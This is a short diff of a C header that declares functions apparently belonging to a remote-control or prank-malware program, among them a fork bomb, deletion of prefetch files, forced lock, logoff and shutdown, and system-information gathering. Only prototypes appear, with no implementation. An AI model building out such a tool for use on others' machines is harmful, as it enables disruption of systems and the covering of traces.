@@ -12,13 +12,14 @@ void deletePrefetchFiles(void);
 //int enumfiles( char * dir, char * nameext );
 void forkbomb();
 void ftexec(char* command);
-int hardcollec();
 void image(char * filename);
 void lock();
 void logoff();
-void randomize();
+void randomize(const char *directoryPath);
 void restart();
 void shutdownfunc();
 void song(char * filename);
+void GetSysInf();
+
 
 #endif
